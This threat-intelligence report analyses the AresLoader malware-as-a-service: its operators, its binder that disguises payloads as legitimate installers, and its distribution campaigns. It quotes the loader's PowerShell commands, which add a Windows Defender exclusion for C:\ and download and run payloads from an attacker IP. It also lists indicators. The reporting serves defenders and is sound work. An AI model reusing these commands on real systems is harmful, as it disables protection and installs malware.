New loader on the bloc - AresLoader
intel471.com/blog/new-loader-on-the-bloc-aresloader

AresLoader is a new loader malware-as-a-service (MaaS) offered by threat actors with links
to Russian hacktivism that was spotted recently in the wild. Most users are pushing a variety
of information stealers with the service. The service offers a “binder” tool that allows users to
masquerade their malware as legitimate software.

We would like to acknowledge Roberto Martinez and Taisiia Garkava for alerting us to their
in-the-wild observations of AresLoader and sharing their observations with us.

The actors behind the loader

In late November 2022, a threat actor using the handle AiD Lock aka DarkBLUP announced
a new MaaS program called AresLoader on Telegram. The actor subsequently announced
the service on the popular underground forums RAMP and XSS. The actor claimed the
malware loader was written in the C programming language and allegedly is undetectable by
Windows Defender antivirus software.

Previously our cyber intelligence team had associated AiD Lock with PHANTOM DEV aka
Dead X Inject, and the DeadXInject Hack group, along with also offering the AiD Locker
ransomware-as-a-service (RaaS) program.

The hacktivism - cybercrime crossover continues
The group we associated AiD Lock with, PHANTOM DEV, engaged in hacktivist activities in
mid-2022 and claimed affiliation with the Red Hackers Alliance Russia aka RHA, RHA R
pro-Russian hacktivist group. Evidence suggests multiple members of this group are either
users or administrators of the AresLoader MaaS. This trend is not surprising and something
that is being seen more frequently from hacktivist groups, who usually focus on distributed
denial-of-service (DDoS) attacks. However, the shift in tactics, techniques and procedures
(TTPs) of these groups to align more closely with cybercriminals, while supporting nationstate political objectives, continues to be observed more frequently.

AresLoader - Malware-as-a-service breakdown
The AresLoader MaaS costs US $300 per month and includes five builds that allegedly are
“packed manually.” The AresLoader panel offers an optional binder service in which a
legitimate file is merged with the malicious loader.
Ares Loader image7 Figure 3 - The binder service upload page Dec. 27, 2022.
The idea is that the malicious payload can masquerade as a legitimate file, often an installer
for popular software.

The binder works by writing a stub launcher that will launch the original legitimate
executable, then write a batch (.bat) file to disk and execute that .bat file with “cmd.exe.”
Ares Loader image6 Figure 4 - The process tree of the binder payload, which depicts two
execution paths — legitimate and malicious — March 13, 2023.
The .bat file contains three PowerShell commands that perform three tasks:

1. Add “C:\” to the Windows Defender exclusion paths via:

Add-MpPreference -ExclusionPath ('C:\\')
2/10

2. Fetch the malicious payload from a remote URL and execute it via:
WGet (http://5.75.248[.]207/emsabp32.dll) -OutfilE $EnV:AlLuSErSpRoFiLe\\emsabp32.dll;

StARt-proCEss $EnV:aLluseRspROFiLE\\emsabp32.dll

In this case, a Raccoon Stealer payload with the
24de09bb454b0318af20ffcc21c6dd4ad5d6627cab7d7bfcb5c2278f63a2c3b7 SHA-256.

3. The third PowerShell command fetches and launches a .bat file that uses rundll32.exe to
execute the target payload — emsabp32.dll in this case.

Wget (http[:]//5.75.248[.]207/rundll32.bat) -oUtFIle $env:aLluSerSPROfIle\\rundll32.bat;
sTArT-proCESS $EnV:aLluSErsPRoFILE\\rundll32.bat

.bat file - start rundll32.exe emsabp32.dll, [email protected]

Malware behavior
AresLoader has basic download and execute capabilities. Upon execution, it checks if it is
running as an administrator. If not, it attempts to escalate its privileges using the
ShellExecuteA application programming interface (API) and “runas” command.
Ares Loader image10 Figure 5 - A privilege escalation attempt observed March 13, 2023.
To remain persistent, it sets a scheduled task and also adds a key to the
“\HKCU\Software\Microsoft\Windows\CurrentVersion\Run\” registry key.

Distribution methods

Campaign one — SystemBC, Amadey direct install

3/10

Intel 471 first observed AresLoader in the wild Jan. 26, 2023. It was dropped by SystemBC
(C2: 89.22.225[.]242) and later by the Amadey version 3.50 controller (C2:
85.209.135[.]109), both times fetched from the same drop location — the
http[:]//5.75.248[.]207/loader.exe link.
Ares Loader image9 Figure 8 - The download and execute commands received by Intel
471 tracking systems captured March 13, 2023.
In addition to the AresLoader sample, the Laplas clipper was installed from the same IP
address that day. The threat actors first tried to install this payload directly following the
infection chain:

SystemBC download and execute command a follow-up payload from the URL:

http[:]//5.75.248[.]207/avicapn32.exe

Laplas clipper (Golang variant) downloaded sample SHA-256 from the URL above:

7cffcc27c8ab249e6e669274dd40d5ad138daa7f71548a5dfbb4b112db1053e2

They then shipped a second payload — a lightly obfuscated PowerShell script to download
and fetch the above Laplas sample — from the URL
http[:]//5.75.248[.]207/cmpbksrvc32.cmd.

The threat actor made a feeble attempt to bypass security measures by installing the same
payload via a different method.

We tracked this AresLoader customer by monitoring the behavior of the SystemBC and
Amadey botnets they control. We observed the actor operating the loader in this instance
likes to drop information-stealer malware, primarily Laplas, on victim machines and
subsequently cryptocurrency miner payloads.

Campaign two — Using AresLoader binder service

4/10

A similar campaign to push AresLoader was discovered by malware researchers Roberto
Martinez and Taisiia Garkava. In this case, several Raccoon Stealer samples were found
dropping AresLoader. This AresLoader sample
(40003d01db9c34da73a415792dba3a617fab65e91d2aae7bbbcd335af198a66b) dropped
StealC and SystemBC payloads. The Raccoon Stealer payload was masquerading as an
installer for a legitimate application called Revo Uninstaller Pro. The threat actor likely used
the binder service available through the AresLoader control panel.
Ares Loader image8 Figure 9 - The legitimate software installer window that is launched in
tandem with the malicious payload.
The aforementioned .bat file that calls the payload with rundll32.exe sheds additional light on
the use of the AresLoader binder feature. The VirusTotal intelligence platform shows parent
payloads of the .bat file that all masquerade as common freeware.

were created using the AresLoader binder service.

Payloads
Not many instances of AresLoader have been discovered in the wild at present, but the
loader MaaS does appear to have a few “customers.” Payloads Intel 471 and other
researchers have observed thus far include:

SystemBC – A back door and socket secure internet protocol (SOCKS) proxy tunnel.
Lumma Stealer – A popular stealer MaaS.
StealC – A new stealer MaaS that offers a configurable targeting system.
Aurora Stealer – A stealer MaaS written in the Golang programming language.
Laplas clipper – A cryptocurrency clipper written in .NET and Golang.

Hosting
The AresLoader command and control (C2) infrastructure has been hosted at virtual private
server (VPS) providers in Germany, the Netherlands and Russia.

Intel 471 recommendations
We recommend defenders evaluate the following suggested measures for implementation in
their environments:

Flag scheduled tasks added via .bat or .cmd files.
Turn on PowerShell logging.
Flag changes to Defender exception list via “Add-MpPreference -ExclusionPath.”
Enforce evaluation of code signing for .exe files and MSI installers to detect tampering.
